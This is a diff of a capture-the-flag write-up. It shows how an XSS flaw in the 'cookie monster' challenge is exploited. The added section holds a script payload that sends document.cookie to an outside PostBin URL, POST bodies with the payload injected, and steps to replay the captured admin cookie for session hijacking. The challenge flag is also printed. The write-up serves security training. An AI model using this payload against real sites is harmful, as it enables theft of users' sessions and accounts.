@@ -16,7 +16,7 @@ http://challenge.acictf.com:27734.
 ```
 ![cookiemonster]()
 
-Based on the name of the challenge and some of the hints, we can assume that we are going to [tealling cookies via XSS](https://www.openlearning.com/u/ivanteong/blog/StealingCookiesViaXssUsingPhpOrRequestbin/).  Lets submit a cookie to the cookie monster (random name and ingredients) and capture the request in burpsuite:
+Based on the name of the challenge and some of the hints, we can assume that we are going to [stealing cookies via XSS](https://www.openlearning.com/u/ivanteong/blog/StealingCookiesViaXssUsingPhpOrRequestbin/).  Lets submit a cookie to the cookie monster (random name and ingredients) and [capture the POST request in Burp Suite](https://portswigger.net/burp/documentation/desktop/tools/proxy/getting-started):
 
 <br />
 
@@ -24,35 +24,67 @@ Based on the name of the challenge and some of the hints, we can assume that we 
 
 <br />
 
-There are two parameters potentially vulnerable to XSS, *name* and *ingredients*.  Lets try toto use a simple JavaScript alert to see if the site is vulnerable to Reflected XSS:
+There are two parameters potentially vulnerable to XSS, *name* and *ingredients*.  Lets use a simple JavaScript alert to see if the site is vulnerable to Reflected XSS:
 ```
 <script>alert("XSS!")</script>
 ```
 
 <br /> 
 
-Now place the JavaScript alert in place of one of the ingredients in burpsuite: 
+Now place the JavaScript alert in place of one of the ingredients in Burp Suite: 
 ```
 name=Sugar&ingredients=<script>alert("XSS!")</script>&ingredients=sugar&ingredients=eggs&ingredients=Add+ingredient
 ```
 
 <br /> 
 
-Forward the POST and we get an alert message on the next page:
+Forward the POST request Burp Suite and we get an alert message on the next page:
 
 <br /> 
 
-![burp2]()
+![alert]()
 
 <br /> 
 
 Now that we know the site is vulnerable to XSS, we can use that to obtain the admin session cookie.  When we slected submit cookie for approval we recived another alert message and a statement saying taht the cookie monster is viewing our cookie.  That will be the point where we should get the cookie.
 
+Use postb.in to received the admin cookie from the victims browser.  After selecting *create bin*, use the URL to craft malicious JavaScript: 
+```
+<script>new Image().src='https://postb.in/1589765685538-7717803197447/malicious.php?code='%2Bdocument.cookie</script>
+```
+
+<br /> 
+
+Inject the malicious Javascript into the POST just like we did with the alert messsage:
+and submit the cookie for approval
+```
+name=Sugar&ingredients=<script>new Image().src='https://postb.in/1589765685538-7717803197447/malicious.php?code='%2Bdocument.cookie</script>&ingredients=sugar&ingredients=eggs&ingredients=Add+ingredient
+```
+
+Refresh the PostBin page and you should see the admin cookie:
+
+<br />
+
+![admincookie]()
+
+<br />
+
+Now that we have the admin cookie 'b4697910-6dbc-4836-851b-a14e7a5bb7d0', we can use this to navigate to the *Cookie Admin* page.  Intercept the GET request in BurpSuite and replace your cookie with the admin cookie:
+
+![burp2]()
+
+<br />
+
+We are presented with a page with a link to *Flag Cookie*.  Click it to get the flag:
 
 
-### Method #1 - PostBin
+<br />
 
-Use postb.in to received the admin cookie from the victims browser.  
+![flagcookie]()
+
+<br />
+
+## Flag: ACI{07c3bc112a56b3d9512b6a54148}
 
 
 
